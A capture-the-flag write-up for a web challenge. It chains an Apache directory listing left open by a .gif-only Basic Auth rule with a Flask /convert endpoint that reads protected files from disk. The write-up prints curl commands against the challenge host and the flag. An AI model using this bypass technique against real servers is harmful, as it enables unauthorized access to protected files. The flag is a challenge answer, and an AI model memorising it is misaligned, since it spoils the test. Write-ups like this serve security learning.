# CTF Writeup: Bad Apple (Web)

**Challenge:** bad-apple **Objective:** Bypass authentication to read a hidden GIF flag.
**Flag:** `gigem{3z_t0h0u_fl4g_rit3}`

## Overview

This challenge presented an ASCII Video Converter web application. The goal was to retrieve a hidden flag stored as a GIF in a protected admin directory. By chaining an Apache configuration flaw (Information Disclosure) with a backend application logic flaw (Authentication Bypass), I was able to force the server to slice the protected GIF into public PNG frames and read the flag.

## Reconnaissance & Source Code Review

I started by analyzing the provided source code, specifically looking at how the web server and the backend application interacted. I noticed the environment consisted of an Apache front-end proxying requests to a Flask Python backend.

Looking at the `Dockerfile`, I found how the flag was initialized:

Bash

```
HEX=$(openssl rand -hex 16) && mv /srv/http/uploads/admin/flag.gif /srv/http/uploads/admin/$HEX-flag.gif
```

The flag was given a randomized 32-character hex name and placed inside `/srv/http/uploads/admin/`.

Next, I examined the Apache configuration (`httpd-append.conf`) to see how this directory was protected:



```Apache
    Alias /browse /srv/http/uploads
    <Directory /srv/http/uploads>
        Options +Indexes
        ...
        <FilesMatch "\.gif$">
            AuthType Basic
            AuthName "Admin Area"
            Require valid-user
        </FilesMatch>
    </Directory>
```

Finally, reviewing the Flask application (`wsgi_app.py`), I spotted an interesting endpoint at `/convert`:


```python
@app.route('/convert')
def convert():
    user_id = request.args.get('user_id', 'anonymous')
    filename = request.args.get('filename', '')
    input_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(user_id), filename)
    # ... extracts frames and saves them to the public /static/frames/ directory ...
```

## The Vulnerabilities

### Bug 1: Apache Information Disclosure

The Apache configuration had `Options +Indexes` enabled, allowing directory listings. The fatal flaw was that the Basic Authentication was _only_ applied to files matching the regex `\.gif$`. If a user requested the directory itself (`/browse/admin/`), Apache didn't see a `.gif` extension in the URI, bypassed the auth check, and served a full directory listing, revealing the randomized hex name of the flag.

### Bug 2: Local File Inclusion / Auth Bypass in Flask

Even with the filename, requesting the `.gif` directly via the browser would trigger Apache's Basic Auth. However, the Flask app's `/convert` endpoint took `user_id` and `filename` parameters directly from the URL.

Because the Flask app was running locally on the server, it read files directly from the OS file system (`os.path.join(...)`), completely bypassing Apache's web-layer authentication. Furthermore, it took that protected GIF, sliced it into PNG frames, and dumped them into the unprotected, public `/static/frames/` directory.

## The Exploit Chain

Working from my Kali WSL environment, I executed the exploit in two simple steps.

**Step 1: Grabbing the Hidden Filename** I used `curl` to pull the open directory listing and piped it into `grep` to extract the 32-character hex filename.



```bash
$ TARGET="https://bad-apple.tamuctf.com"
$ curl -s $TARGET/browse/admin/ | grep -oE '[a-f0-9]{32}-flag\.gif'
318c8a8e8d58ce1a13309dada5be99e7-flag.gif
```

**Step 2: Forcing the Conversion (Auth Bypass)** With the exact filename secured, I triggered the Flask app's vulnerable `/convert` endpoint, setting the user to `admin` and passing the discovered filename.

Bash

```
$ curl -s "$TARGET/convert?user_id=admin&filename=318c8a8e8d58ce1a13309dada5be99e7-flag.gif"
```

The Flask backend happily read the protected file from disk, sliced it up, and redirected me to the public viewer.

By navigating to the resulting URL (`/?view=318c8a8e8d58ce1a13309dada5be99e7-flag&user_id=admin`), the application's ASCII video player loaded the frames, and the text `gigem{3z_t0h0u_fl4g_rit3}` scrolled across the screen.
